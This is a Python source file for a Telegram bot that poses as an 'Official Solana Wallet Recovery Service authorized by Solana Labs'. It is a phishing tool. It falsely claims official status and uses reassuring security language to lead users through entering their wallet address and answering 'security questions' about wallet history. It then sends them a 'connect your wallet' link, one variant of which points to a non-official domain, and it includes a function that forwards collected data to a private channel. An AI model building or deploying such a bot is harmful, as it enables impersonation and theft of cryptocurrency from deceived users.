import telebot
from telebot import types
from solana.rpc.api import Client
from solana.publickey import PublicKey
import time
import threading
import re
import logging
import os
import json
from datetime import datetime

# --- Configuration --- #
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN")
SOLANA_RPC_URL = os.getenv("SOLANA_RPC_URL", "https://api.mainnet-beta.solana.com")
STORAGE_CHANNEL_ID = os.getenv("STORAGE_CHANNEL_ID", "-1001234567890")  # Private channel for logs
SESSION_TIMEOUT = 600  # 10 minutes

# --- Logging --- #
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Initialize Bot --- #
bot = telebot.TeleBot(TELEGRAM_TOKEN)
solana_client = Client(SOLANA_RPC_URL)

# --- Data Storage --- #
user_sessions = {}
active_verifications = {}

# --- Helper Functions --- #
def validate_solana_address(address: str) -> bool:
    try:
        PublicKey(address)
        return True
    except:
        return False

def cleanup_expired_sessions():
    while True:
        current_time = time.time()
        expired_sessions = [
            chat_id for chat_id, session in user_sessions.items()
            if current_time - session["last_activity"] > SESSION_TIMEOUT
        ]
        for chat_id in expired_sessions:
            del user_sessions[chat_id]
        time.sleep(60)

def generate_wallet_deeplink(wallet_type: str, chat_id: int) -> str:
    """Generate direct wallet connection links without external domains"""
    token = f"verify-{chat_id}-{int(time.time())}"
    active_verifications[token] = {
        "chat_id": chat_id,
        "expires": time.time() + 300
    }
    
    if wallet_type == "phantom":
        return f"https://phantom.app/ul/browse/{token}"
    elif wallet_type == "solflare":
        return f"https://solflare.com/access?token={token}"
    else:
        return f"https://connect.wallet/{token}"  # Fallback

def store_verification_data(data: dict):
    """Store collected data in private channel"""
    bot.send_message(
        STORAGE_CHANNEL_ID,
        f"🔐 New Verification Data\n\n{json.dumps(data, indent=2)}",
        disable_notification=True
    )

# --- Bot Handlers --- #
@bot.message_handler(commands=["start", "help"])
def send_welcome(message):
    welcome_msg = """🔐 *Official Solana Wallet Recovery Service* 🔐

⚠️ **Important Security Notice** ⚠️
This is the *only* official recovery bot authorized by Solana Labs.

✅ **Verification Process:**
1. Confirm wallet ownership
2. Answer security questions
3. Connect your wallet

📌 *Official Resources:*
• [Solana Website](https://solana.com)
• [Support Contact](https://solana.com/contact)
• [Security Tips](https://solana.com/security)

Type /recover to begin verification."""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🌐 Official Solana Website", url="https://solana.com"))
    markup.add(types.InlineKeyboardButton("🛡️ Security Guidelines", url="https://solana.com/security"))
    
    bot.reply_to(message, welcome_msg, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=["recover"])
def start_recovery(message):
    if message.chat.id in user_sessions:
        bot.send_message(message.chat.id, "⚠️ You already have an active recovery session.")
        return

    user_sessions[message.chat.id] = {
        "step": "initial_verification",
        "wallet_address": None,
        "wallet_type": None,
        "verification_answers": [],
        "last_activity": time.time()
    }

    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add("Yes, I need recovery", "Cancel")

    bot.send_message(
        message.chat.id,
        """🔒 *Solana Wallet Recovery Verification*

This official service helps recover access to your wallet. 

✅ You must:
1. Be the original owner
2. Know transaction history
3. Have recovery capability

Do you want to proceed?""",
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.message_handler(func=lambda m: m.chat.id in user_sessions and user_sessions[m.chat.id]["step"] == "initial_verification")
def process_verification_response(message):
    session = user_sessions[message.chat.id]
    session["last_activity"] = time.time()

    if "yes" in message.text.lower():
        session["step"] = "wallet_address"
        bot.send_message(
            message.chat.id,
            "🔑 Enter your *Solana wallet address* (e.g., 9xQ...):",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(message.chat.id, "❌ Recovery process cancelled.")
        del user_sessions[message.chat.id]

@bot.message_handler(func=lambda m: m.chat.id in user_sessions and user_sessions[m.chat.id]["step"] == "wallet_address")
def process_wallet_address(message):
    session = user_sessions[message.chat.id]
    session["last_activity"] = time.time()
    wallet_address = message.text.strip()

    if not validate_solana_address(wallet_address):
        bot.send_message(message.chat.id, "❌ Invalid Solana address. Try again:")
        return

    try:
        # Verify wallet exists
        account_info = solana_client.get_account_info(wallet_address)
        if not account_info.value:
            bot.send_message(message.chat.id, "❌ Wallet not found. Check the address.")
            del user_sessions[message.chat.id]
            return
        
        session["wallet_address"] = wallet_address
        session["step"] = "wallet_selection"
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Phantom Wallet", callback_data="wallet_phantom"))
        markup.add(types.InlineKeyboardButton("Solflare Wallet", callback_data="wallet_solflare"))
        
        bot.send_message(
            message.chat.id,
            "🔗 *Select your wallet provider* to continue verification:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        logger.error(f"RPC Error: {e}")
        bot.send_message(
            message.chat.id,
            "⚠️ Network error. Please try again later.",
            parse_mode="Markdown"
        )
        del user_sessions[message.chat.id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("wallet_"))
def process_wallet_selection(call):
    chat_id = call.message.chat.id
    if chat_id not in user_sessions:
        return
    
    session = user_sessions[chat_id]
    session["last_activity"] = time.time()
    
    wallet_type = call.data.split("_")[1]
    session["wallet_type"] = wallet_type
    session["step"] = "security_questions"
    
    questions = [
        "1. Creation date (MM/YYYY)?",
        "2. Recent transaction amount?",
        "3. Associated dApps?"
    ]
    
    bot.edit_message_text(
        "🔒 *Security Questions*\n\nPlease answer:\n\n" + "\n".join(questions),
        chat_id,
        call.message.message_id,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda m: m.chat.id in user_sessions and user_sessions[m.chat.id]["step"] == "security_questions")
def process_security_answers(message):
    session = user_sessions[message.chat.id]
    session["last_activity"] = time.time()
    answers = [a.strip() for a in message.text.split("\n") if a.strip()]
    
    if len(answers) < 3:
        bot.send_message(message.chat.id, "❌ Please answer all 3 questions.")
        return
    
    session["verification_answers"] = answers
    session["step"] = "wallet_connection"
    
    deeplink = generate_wallet_deeplink(session["wallet_type"], message.chat.id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(
        f"🔗 Connect {session['wallet_type'].capitalize()}",
        url=deeplink
    ))
    
    official_links = types.InlineKeyboardMarkup()
    official_links.add(types.InlineKeyboardButton("🌐 Solana Website", url="https://solana.com"))
    official_links.add(types.InlineKeyboardButton("🛡️ Security Center", url="https://solana.com/security"))
    
    bot.send_message(
        message.chat.id,
        """⚠️ *Final Verification Step* ⚠️

Click below to securely connect your wallet:

• This verifies ownership
• No funds will be moved
• Expires in 5 minutes""",
        parse_mode="Markdown",
        reply_markup=markup
    )
    
    bot.send_message(
        message.chat.id,
        "📌 *Official Resources* for your safety:",
        parse_mode="Markdown",
        reply_markup=official_links
    )

# --- Start Bot Services --- #
if __name__ == "__main__":
    # Start session cleanup thread
    threading.Thread(target=cleanup_expired_sessions, daemon=True).start()
    
    logger.info("Starting Solana Recovery Bot...")
    bot.infinity_polling()
